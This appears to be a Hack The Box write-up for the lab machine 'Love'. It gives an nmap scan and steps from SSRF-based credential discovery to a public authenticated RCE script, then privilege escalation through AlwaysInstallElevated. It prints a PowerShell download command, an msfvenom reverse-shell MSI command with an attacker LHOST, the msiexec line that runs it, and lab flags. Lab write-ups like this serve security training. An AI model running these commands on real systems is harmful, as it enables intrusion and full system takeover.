+++
title = "HTB - Love"
date = 2024-11-30
+++

### Scan
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 21:26 EST
Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 57.89% done; ETC: 21:28 (0:00:40 remaining)
Nmap scan report for 10.10.10.239
Host is up (0.11s latency).
Not shown: 64649 closed tcp ports (reset), 867 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   giop: 
|_    Host '10.10.14.3' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2024-11-06T02:51:20+00:00; +21m32s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=11/5%Time=672AD3FD%P=aarch64-unknown-linux
SF:-gnu%r(giop,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.3'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h21m32s, deviation: 4h00m01s, median: 21m31s
| smb2-time: 
|   date: 2024-11-06T02:51:06
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-05T18:51:04-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 229.17 seconds
```

### Enumeration
Voting interface. Not bespoke!
Apache 2.4.46
PHP 7.3.27
AdminLTE v2.4.0
Subdomain: `staging.love.htb`

### Initial Access
File Scanning tool using links. Potential SSRF vulnerability. 
Go through POC with verifying connectivity back to our machine using a python instance. 
Then, practice using Burp/FFUF/wfuzz to iterate different potential ports on the local machine (0-65535)
Credentials: `@LoveIsInTheAir!!!!` when we connect on port 5000. Pretty common port configuration, no?
`searchsploit` shows an authenticated RCE opportunity via `49445.py`
Be careful, though. We've got to update the script and fix the directory listing to match our particular instance for this box.
There is no `/votingsystem/` directory, and we can use our `feroxbuster` scan to update.
Once the configurations are set, run the script.
User: `413594a7914d7c19c5438444e936dc2a`

### Privilege Escalation
Check privileges w/ `whomai /priv`
Serve `winPEAS` w/ 
`powershell "Invoke-WebRequest -UseBasicParsing 10.10.14.10:8000/winPEASany.exe -OutFile winPEAS.exe"`
A few things noted while combing through:
- A powershell history file
- `AlwaysInstallElevated` is set to 1
We are abled to create directories
Reading from 0xdf, `AlwaysInstallElevated` is the true red flag here, though the others aren't good at all for preferred security posture. Read up on this for report
This essentially tells windows that a user can execute `.msi` files as NT Authority or System.
We can use `msfvenom` to craft a payload
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10. LPORT=443 -f msi > mal.msi`
Once finished, we can serve with python, and run the file with `msiexec`
`msiexec /quiet /qn /i mal.msi`
On your listener, you should get a call back ;)
Root: `a9d6d689fe09175d2786a97818d0da6a`